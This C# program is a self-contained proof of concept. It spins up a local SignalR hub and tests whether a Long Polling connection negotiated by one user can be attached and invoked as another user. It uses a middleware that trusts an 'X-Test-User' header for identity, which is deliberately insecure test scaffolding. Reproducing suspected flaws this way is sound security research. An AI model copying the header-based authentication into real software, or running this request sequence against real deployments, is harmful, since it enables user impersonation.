using System.Net.Http.Headers;
using System.Security.Claims;
using System.Text;
using System.Text.Json;
using Microsoft.AspNetCore.Hosting.Server;
using Microsoft.AspNetCore.Hosting.Server.Features;
using Microsoft.AspNetCore.SignalR;

var builder = WebApplication.CreateBuilder(args);
builder.WebHost.UseUrls("http://127.0.0.1:0");
builder.Services.AddSignalR();
var app = builder.Build();

app.Use(async (context, next) =>
{
    var testUser = context.Request.Headers["X-Test-User"].ToString();
    if (!string.IsNullOrWhiteSpace(testUser))
    {
        var identity = new ClaimsIdentity(
            new[] { new Claim(ClaimTypes.Name, testUser) },
            "LocalSignalRPoC", ClaimTypes.Name, ClaimTypes.Role);
        context.User = new ClaimsPrincipal(identity);
    }
    await next();
});

app.MapHub<IdentityProbeHub>("/probe");
await app.StartAsync();
try
{
    var server = app.Services.GetRequiredService<IServer>();
    var address = server.Features.Get<IServerAddressesFeature>()!.Addresses.Single();
    using var client = new HttpClient { Timeout = TimeSpan.FromSeconds(25) };
    Console.WriteLine($"Local test server: {address}");
    Console.WriteLine($"Runtime: {System.Runtime.InteropServices.RuntimeInformation.FrameworkDescription}");

    var control = await RunScenario(client, address, "Alice", "Alice", "Alice");
    Console.WriteLine($"CONTROL: {control.Status}; Hub saw: {control.Identity ?? "<none>"}; {control.Detail}");
    if (control.Status != ScenarioStatus.Completed || control.Identity != "Alice")
    {
        Console.WriteLine("INCONCLUSIVE: positive control failed; cross-identity case not run.");
        Environment.ExitCode = 2;
        return;
    }

    var candidate = await RunScenario(client, address, "Alice", "Alice", "Bob");
    Console.WriteLine($"CROSS-IDENTITY: {candidate.Status}; Hub saw: {candidate.Identity ?? "<none>"}; {candidate.Detail}");
    if (candidate.Status == ScenarioStatus.Completed && candidate.Identity == "Bob")
        Console.WriteLine("VULNERABILITY_REPRODUCED: Hub invocation executed as attaching identity Bob.");
    else if (candidate.Status == ScenarioStatus.Completed)
    {
        Console.WriteLine($"NOT_REPRODUCED: Hub observed '{candidate.Identity ?? "<anonymous>"}', not Bob.");
        Environment.ExitCode = 1;
    }
    else
    {
        Console.WriteLine("INCONCLUSIVE: cross-identity invocation did not complete.");
        Environment.ExitCode = 2;
    }
}
finally { await app.StopAsync(); }

static async Task<ScenarioResult> RunScenario(HttpClient client, string address,
    string negotiateIdentity, string sendIdentity, string attachIdentity)
{
    var root = address.TrimEnd('/');
    using var negotiate = new HttpRequestMessage(HttpMethod.Post, $"{root}/probe/negotiate?negotiateVersion=1");
    negotiate.Headers.Add("X-Test-User", negotiateIdentity);
    using var nr = await client.SendAsync(negotiate);
    var nb = await nr.Content.ReadAsStringAsync();
    if (!nr.IsSuccessStatusCode) return new(ScenarioStatus.Rejected, null, $"negotiate {(int)nr.StatusCode}: {nb}");
    using var json = JsonDocument.Parse(nb);
    var token = json.RootElement.GetProperty("connectionToken").GetString();
    if (string.IsNullOrWhiteSpace(token)) return new(ScenarioStatus.Rejected, null, "empty connectionToken");
    var url = $"{root}/probe?id={Uri.EscapeDataString(token)}";

    // First Long Polling GET attaches the transport.
    using var firstGet = new HttpRequestMessage(HttpMethod.Get, url);
    firstGet.Headers.Add("X-Test-User", attachIdentity);
    using var firstResponse = await client.SendAsync(firstGet);
    var firstBody = await firstResponse.Content.ReadAsStringAsync();
    if (!firstResponse.IsSuccessStatusCode) return new(ScenarioStatus.Rejected, null, $"attach GET {(int)firstResponse.StatusCode}: {firstBody}");

    // Send the SignalR handshake alone. The server's "{}<RS>" response is
    // delivered by a subsequent Long Polling GET.
    using var handshake = new HttpRequestMessage(HttpMethod.Post, url);
    handshake.Headers.Add("X-Test-User", sendIdentity);
    handshake.Content = new ByteArrayContent(Encoding.UTF8.GetBytes("{\"protocol\":\"json\",\"version\":1}\u001e"));
    handshake.Content.Headers.ContentType = new MediaTypeHeaderValue("application/octet-stream");
    using var hr = await client.SendAsync(handshake);
    var hb = await hr.Content.ReadAsStringAsync();
    if (!hr.IsSuccessStatusCode) return new(ScenarioStatus.Rejected, null, $"handshake POST {(int)hr.StatusCode}: {hb}");

    var handshakePoll = await Poll(client, url, attachIdentity);
    if (!handshakePoll.Success) return new(ScenarioStatus.Rejected, null, $"handshake poll failed: {handshakePoll.Body}");
    if (!handshakePoll.Body.Contains("{}", StringComparison.Ordinal))
        return new(ScenarioStatus.NoCompletion, null, $"expected handshake ack, got: {handshakePoll.Body}");

    // Only after the handshake acknowledgement send the Hub invocation.
    using var invoke = new HttpRequestMessage(HttpMethod.Post, url);
    invoke.Headers.Add("X-Test-User", sendIdentity);
    invoke.Content = new ByteArrayContent(Encoding.UTF8.GetBytes(
        "{\"type\":1,\"invocationId\":\"identity-check-1\",\"target\":\"WhoAmI\",\"arguments\":[]}\u001e"));
    invoke.Content.Headers.ContentType = new MediaTypeHeaderValue("application/octet-stream");
    using var ir = await client.SendAsync(invoke);
    var ib = await ir.Content.ReadAsStringAsync();
    if (!ir.IsSuccessStatusCode) return new(ScenarioStatus.Rejected, null, $"invocation POST {(int)ir.StatusCode}: {ib}");

    var response = await Poll(client, url, attachIdentity);
    if (!response.Success) return new(ScenarioStatus.Rejected, null, $"invocation poll failed: {response.Body}");
    foreach (var frame in response.Body.Split('\u001e', StringSplitOptions.RemoveEmptyEntries))
    {
        using var msg = JsonDocument.Parse(frame);
        var obj = msg.RootElement;
        if (obj.TryGetProperty("type", out var type) && type.GetInt32() == 3 &&
            obj.TryGetProperty("invocationId", out var id) && id.GetString() == "identity-check-1" &&
            obj.TryGetProperty("result", out var result))
            return new(ScenarioStatus.Completed, result.GetString(), null);
    }
    return new(ScenarioStatus.NoCompletion, null, $"no invocation completion: {response.Body}");
}

static async Task<(bool Success, string Body)> Poll(HttpClient client, string url, string identity)
{
    using var get = new HttpRequestMessage(HttpMethod.Get, url);
    get.Headers.Add("X-Test-User", identity);
    using var response = await client.SendAsync(get);
    return (response.IsSuccessStatusCode, await response.Content.ReadAsStringAsync());
}

public sealed class IdentityProbeHub : Hub
{
    public string WhoAmI() => Context.User?.Identity?.Name ?? "<anonymous>";
}
public enum ScenarioStatus { Completed, Rejected, NoCompletion }
public sealed record ScenarioResult(ScenarioStatus Status, string? Identity, string? Detail);
